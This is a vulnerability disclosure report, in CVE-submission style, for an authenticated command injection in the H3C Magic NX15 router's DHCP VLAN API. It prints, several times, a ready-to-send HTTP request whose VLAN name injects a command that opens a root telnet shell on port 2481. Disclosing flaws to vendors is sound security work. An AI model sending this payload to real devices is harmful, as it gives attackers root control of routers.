# H3C Magic NX15 `esps.dhcpd.vlan.getlist` Authenticated OS Command Injection to Root Remote Code Execution

## Vulnerability Summary

- Discovery date: 2026-06-11
- Researcher: coconut
- Vendor: H3C
- Product: H3C Magic NX15
- Verified firmware / software version: NX15V100R017
- Affected version(s): NX15V100R017 confirmed; other versions not verified
- Component: `usr/libexec/rpcd/esps.dhcpd.vlan` `getlist` handler and its `eval vlan_name_list${idx}` sink
- Reachable endpoint: `POST /api/esps`
- Reachable method / action: `object="esps.dhcpd.vlan"`, `method="getlist"`
- Authentication: administrator
- Attack vector: remote
- Impact: authenticated arbitrary OS command execution as root from a single JSON request
- Root cause class: shell command injection caused by direct `eval` of attacker-controlled VLAN names
- Candidate CWEs: `CWE-78`
- Disclosure status: private
- CVE ID: pending

## CVE Submission-Style Summary

H3C Magic NX15 firmware `NX15V100R017` contains an authenticated OS command injection vulnerability in the `esps.dhcpd.vlan.getlist` handler reachable via `POST /api/esps`. The handler reads attacker-controlled entries from the JSON `list[]` array and places each value into `eval vlan_name_list${idx}="$vlan_name"` without neutralizing shell metacharacters. This allows a remote attacker with a valid administrator session to execute arbitrary OS commands as root via a crafted VLAN name such as `VLAN1$(...)`.

The issue was verified by source inspection of `usr/libexec/rpcd/esps.dhcpd.vlan`, the local report, and the included PoC. On the tested target, the API could still return `DHCP:Unknown VLAN`, yet the payload had already executed, opening a root shell and producing the marker string `DHCPD_VLAN_GETLIST_RCE_OK`.

## Attack Surface

The issue is reachable through the authenticated H3C web management API at `POST /api/esps`. The request selects `object="esps.dhcpd.vlan"` and `method="getlist"`, then supplies attacker-controlled strings inside `param.list`. The vulnerable wrapper immediately reparses each string through `eval` before later VLAN-existence checks run.

If useful, the request envelope is:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>
```

And the relevant request or trigger shape is:

```json
[
  {
    "id": 1,
    "object": "esps.dhcpd.vlan",
    "method": "getlist",
    "param": {
      "list": [
        "VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2481 -l /bin/sh >/dev/null 2>&1)"
      ]
    }
  }
]
```

## Authentication Boundary

This issue requires a valid web administrator session token returned by `POST /api/login/auth`. The attacker authenticates, reuses the token in the `AUTHENTICATION` header for `POST /api/esps`, and then sends a normal JSON body. No raw-body quote bypass is required for this vulnerability.

## Root Cause

### 1. Vulnerable input source

The `getlist` handler reads attacker-controlled VLAN names from the JSON `list[]` array in the `/api/esps` request body.

```text
json_get_values vlan_name_list list
```

### 2. Vulnerable sink

The wrapper places each attacker-controlled VLAN string into an `eval` assignment before any later business checks reject the unknown VLAN name.

```text
for vlan_name in $vlan_name_list; do
    eval vlan_name_list${idx}="$vlan_name"
    idx=$((idx+1))
done
```

### 3. Why exploitation works

- `list[]` entries are fully attacker-controlled.
- The first dangerous operation is a direct `eval` on each VLAN name.
- Shell command substitution such as `$(...)` is active in that `eval` context.
- Later VLAN-existence checks happen after the command-execution side effect and therefore do not prevent it.
- The API may still return `DHCP:Unknown VLAN`, so response codes alone do not indicate exploitation failure.

## Reverse Engineering Evidence

### Primary function / handler evidence

- file / module: `usr/libexec/rpcd/esps.dhcpd.vlan`
- function name: `getlist)`
- function address: `N/A`
- function size: `N/A`

Relevant decompiled or source-level snippet:

```text
json_get_values vlan_name_list list
...
for vlan_name in $vlan_name_list; do
    eval vlan_name_list${idx}="$vlan_name"
    idx=$((idx+1))
done
```

### Control-flow or data-flow summary

`POST /api/esps` -> `esps.dhcpd.vlan getlist` -> `json_get_values ... list` -> `eval vlan_name_list${idx}="$vlan_name"` -> command substitution executes -> later VLAN check may return `DHCP:Unknown VLAN` -> root shell and marker already created

## Verified Exploitation Chain

### Mode A: one-request authenticated root RCE via VLAN name command substitution

- prerequisites: network reachability to `192.168.8.1` and a valid administrator session token
- injected field / primitive: `param.list[]`
- target path / object / resource: `esps.dhcpd.vlan.getlist` wrapper-level `eval`
- verified payload:

```text
VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2481 -l /bin/sh >/dev/null 2>&1)
```

Effect:
1. Authenticate to the web API and obtain a session token.
2. Send `POST /api/esps` with `object="esps.dhcpd.vlan"`, `method="getlist"`, and the payload above as the first `list[]` entry.
3. The handler executes the command substitution during the `eval` assignment and may still return `DHCP:Unknown VLAN`.
4. A shell on TCP/2481 and the marker file `DHCPD_VLAN_GETLIST_RCE_OK` prove root command execution.

## Live Exploitation Evidence

### PoC-generated payload

```text
VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2481 -l /bin/sh >/dev/null 2>&1)
```

### PoC-sent request body

```json
[
  {
    "id": 1,
    "object": "esps.dhcpd.vlan",
    "method": "getlist",
    "param": {
      "list": [
        "VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2481 -l /bin/sh >/dev/null 2>&1)"
      ]
    }
  }
]
```

### Success condition

Either a business error such as `DHCP:Unknown VLAN` together with a successful TCP connection to `192.168.8.1:2481`, or the marker file `DHCPD_VLAN_GETLIST_RCE_OK`, proving that command execution happened before the later VLAN check.

## Why This Is Root Remote Code Execution

This issue is correctly classified as root remote code execution because the verified exploit path yields attacker-controlled code execution in the device's privileged management or update-processing context and the observed effects are not limited to inert configuration corruption. The local report and PoC demonstrate that successful exploitation crosses into the root trust boundary and produces attacker-controlled execution or installation effects that are sufficient for full device compromise.

## Minimal HTTP Request Shape

### 1. Trigger request

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>

[{"id":1,"object":"esps.dhcpd.vlan","method":"getlist","param":{"list":["VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2481 -l /bin/sh >/dev/null 2>&1)"]}}]
```

## Minimal Vulnerable Flow

```text
Authenticated remote attacker -> `/api/esps` `object=esps.dhcpd.vlan` `method=getlist` -> attacker string enters `list[]` -> wrapper executes `eval vlan_name_list${idx}="$vlan_name"` -> `$(...)` runs as root -> later business error may still be returned
```

## Included Local Submission Artifacts

- Primary local report: `report/postauth_esps_dhcpd_vlan_getlist_rce_report.md`
- `poc/postauth_esps_dhcpd_vlan_getlist_rce.py`
